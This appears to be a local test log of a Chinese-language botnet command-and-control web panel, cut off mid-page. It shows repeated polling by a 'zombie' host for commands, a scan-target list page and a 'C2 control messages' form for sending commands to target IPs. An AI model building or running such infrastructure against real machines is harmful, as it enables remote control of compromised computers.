2025-06-25 11:25:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:44 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:46 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:47 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:49 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:50 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:51 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:52 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0019s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:54 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:55 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:56 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:57 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:59 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:01 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:02 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:04 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:06 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:07 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:09 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:10 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:11 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:12 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:13 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:14 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:15 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:16 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:17 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:18 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 index()
2025-06-25 11:26:19 | INFO     | index_routes.py:15 | index() | 用戶訪問首頁
2025-06-25 11:26:19 | INFO     | index_routes.py:18 | index() | 查詢到 0 個目標
2025-06-25 11:26:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] index 執行完畢 (耗時: 0.0046s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>扫描目标管理系统</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container mt-4">\n    \n        \n    \n\n    <div class="card shadow">\n        <div class="card-header bg-primary text-white d-flex justify-content-between align-items-center">\n            <h4 class="mb-0"><i class="fas fa-list"></i> 扫描目标列表</h4>\n            <a href="/add_target" class="btn btn-light">\n                <i class="fas fa-plus"></i> 添加新目标\n            </a>\n        </div>\n        <div class="card-body">\n            \n                <div class="alert alert-info mb-0">\n                    <i class="fas fa-info-circle"></i> 暂无扫描目标，请点击右上角"添加新目标"按钮添加\n                </div>\n            \n        </div>\n    </div>\n</div>\n\n<!-- 删除确认模态框 -->\n<div class="modal fade" id="deleteModal" tabindex="-1" aria-labelledby="deleteModalLabel" aria-hidden="true">\n    <div class="modal-dialog">\n        <div class="modal-content">\n            <div class="modal-header bg-danger text-white">\n                <h5 class="modal-title" id="deleteModalLabel"><i class="fas fa-exclamation-triangle"></i> 确认删除</h5>\n                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>\n            </div>\n            <div class="modal-body">\n                您确定要删除以下目标吗？<br>\n                <strong>URL: <span id="delete-url"></span></strong><br>\n                <strong>域名: <span id="delete-domain"></span></strong><br>\n                <small class="text-danger">* 此操作不可逆，删除后将无法恢复。</small>\n            </div>\n            <div class="modal-footer">\n                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">取消</button>\n                <form id="deleteForm" method="POST">\n                    <button type="submit" class="btn btn-danger">确认删除</button>\n                </form>\n            </div>\n        </div>\n    </div>\n</div>\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n<script>\n    // 删除目标功能\n    document.addEventListener(\'DOMContentLoaded\', function() {\n        // 获取所有删除按钮\n        const deleteButtons = document.querySelectorAll(\'.delete-target\');\n        const deleteModal = document.getElementById(\'deleteModal\');\n        const deleteUrl = document.getElementById(\'delete-url\');\n        const deleteDomain = document.getElementById(\'delete-domain\');\n        const deleteForm = document.getElementById(\'deleteForm\');\n        \n        // 为每个删除按钮添加点击事件\n        deleteButtons.forEach(button => {\n            button.addEventListener(\'click\', function() {\n                const targetId = this.getAttribute(\'data-id\');\n                const targetUrl = this.getAttribute(\'data-url\');\n                const targetDomain = this.getAttribute(\'data-domain\');\n                \n                // 更新模态框内容\n                deleteUrl.textContent = targetUrl;\n                deleteDomain.textContent = targetDomain || \'未设置\';\n                \n                // 设置表单提交地址\n                deleteForm.action = `/delete_target/${targetId}`;\n                \n                // 显示模态框\n                const modal = new bootstrap.Modal(deleteModal);\n                modal.show();\n            });\n        });\n        \n        // 也可以添加AJAX方式删除\n        /*\n        deleteForm.addEventListener(\'submit\', function(e) {\n            e.preventDefault();\n            \n            const targetId = this.action.split(\'/\').pop();\n            \n            fetch(`/api/delete_target/${targetId}`, {\n                method: \'POST\'\n            })\n            .then(response => response.json())\n            .then(data => {\n                if (data.success) {\n                    // 关闭模态框\n                    bootstrap.Modal.getInstance(deleteModal).hide();\n                    // 刷新页面\n                    window.location.reload();\n                } else {\n                    alert(\'删除失败：\' + data.message);\n                }\n            })\n            .catch(error => {\n                console.error(\'Error:\', error);\n                alert(\'删除请求发送失败，请重试\');\n            });\n        });\n        */\n    });\n</script>\n\n    </body>\n    \n</html>'
2025-06-25 11:26:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:19] "GET / HTTP/1.1" 200 -
2025-06-25 11:26:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:19] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 11:26:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:19 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 11:26:21 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-25 11:26:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0011s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" 